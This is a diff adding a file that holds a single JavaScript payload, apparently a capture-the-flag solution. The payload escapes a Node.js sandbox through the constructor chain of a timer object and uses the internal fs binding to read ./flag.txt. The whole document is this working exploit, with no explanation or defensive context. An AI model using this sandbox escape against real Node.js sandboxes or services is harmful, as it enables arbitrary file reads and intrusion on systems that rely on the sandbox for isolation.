@@ -1,0 +1,5 @@
+Payload:
+=========================================
+
+(function () { exports.process = setTimeout(()=>{}).ref().constructor.constructor('buffer = Buffer.allocUnsafe(8000); process.binding("fs").read(process.binding("fs").open("./flag.txt",0,0600),buffer,0,4096);return buffer.toString("utf-8",0,50)')();})()
+
